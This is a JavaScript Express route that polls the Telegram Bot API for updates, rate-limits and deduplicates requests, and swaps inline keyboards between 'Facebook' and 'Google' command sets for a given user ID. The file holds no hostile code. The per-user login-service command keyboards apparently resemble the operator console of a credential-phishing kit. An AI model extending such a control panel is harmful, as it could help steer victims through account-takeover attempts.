import express from "express";
import axios from "axios";
import { buildFacebookKeyboard, buildGoogleKeyboard } from "../utils/gmailTelegramCommands.js";

const router = express.Router();

// Request management
let isRequestActive = false;
let activeRequestPromise = null; // Promise representing the in-flight Telegram request
let lastRequestTime = 0;
const MIN_REQUEST_INTERVAL = 100; // Minimum time between Telegram API calls in milliseconds
const REQUEST_TIMEOUT = 10000;

const handleKeyboardSwitch = async (callbackQuery) => {
  try {
    const [command, userId] = callbackQuery.data.split(" ");
    if (command !== "/switch-fb" && command !== "/switch-gm") return;
    const target = command === "/switch-fb" ? "fb" : "gm";
    const keyboard = target === "fb" ? buildFacebookKeyboard(userId) : buildGoogleKeyboard(userId);
    const chatId = callbackQuery.message?.chat?.id;
    const messageId = callbackQuery.message?.message_id;
    if (!chatId || !messageId) return;
    await axios.post(`https://api.telegram.org/bot${process.env.BOT}/editMessageReplyMarkup`, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: keyboard,
    });
    await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
      callback_query_id: callbackQuery.id,
      text: target === "fb" ? "Switched to Facebook commands" : "Switched to Google commands",
    }).catch(() => {});
  } catch (error) {
    console.warn("[getMessages] Inline keyboard switch failed:", error.message);
  }
};

const makeRequest = async () => {
  try {
    const result = await axios.get(
      `https://api.telegram.org/bot${process.env.BOT}/getUpdates?offset=-1`,
      {
        timeout: REQUEST_TIMEOUT,
        headers: {
          Connection: "close",
        },
      }
    );

    const data = result.data;
    if (data?.result) {
      for (const update of data.result) {
        if (update.callback_query?.data?.startsWith("/switch-")) {
          await handleKeyboardSwitch(update.callback_query);
        }
      }
    }

    return data;
  } finally {
    isRequestActive = false;
    activeRequestPromise = null;
  }
};

router.get("/", async (req, res) => {
  try {
    // Check if Telegram credentials are configured
    if (!process.env.BOT) {
      return res.status(503).json({
        success: false,
        message: "Telegram bot not configured",
      });
    }

    const now = Date.now();
    const timeSinceLastRequest = now - lastRequestTime;

    // If a request is already in progress, wait for it and return the same response
    if (isRequestActive && activeRequestPromise) {
      try {
        const cachedData = await activeRequestPromise;
        return res.status(200).json({
          success: true,
          data: cachedData,
        });
      } catch (err) {
        // Fall-through to error handler below
        throw err;
      }
    }

    // If we hit the minimum interval, short-circuit with empty array (rate-limit guard)
    if (timeSinceLastRequest < MIN_REQUEST_INTERVAL) {
      return res.status(200).json({
        success: true,
        data: {
          ok: true,
          result: [],
        },
      });
    }

    // Create a single shared promise for this cycle so that other callers can await it
    isRequestActive = true;
    lastRequestTime = now;
    activeRequestPromise = makeRequest();

    const data = await activeRequestPromise;

    res.status(200).json({
      success: true,
      data: data,
    });
  } catch (error) {
    console.error("Error in /api/getMessages:", error.message);

    // Handle 409 Conflict specifically
    if (error.response?.status === 409) {
      console.warn(
        "Telegram 409 Conflict - multiple getUpdates requests detected"
      );
      isRequestActive = false;
      activeRequestPromise = null;
      return res.status(200).json({
        success: true,
        data: {
          ok: true,
          result: [],
        },
      });
    }

    // Handle timeout
    if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
      return res.status(408).json({
        success: false,
        message: "Request timeout",
      });
    }

    // Handle invalid bot token
    if (error.response?.status === 401) {
      return res.status(503).json({
        success: false,
        message: "Invalid Telegram bot token",
      });
    }

    // Handle network errors
    if (error.code === "ECONNRESET" || error.code === "ENOTFOUND") {
      return res.status(503).json({
        success: false,
        message: "Network error - Telegram API unavailable",
      });
    }

    return res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message,
    });
  }
});

export default router;
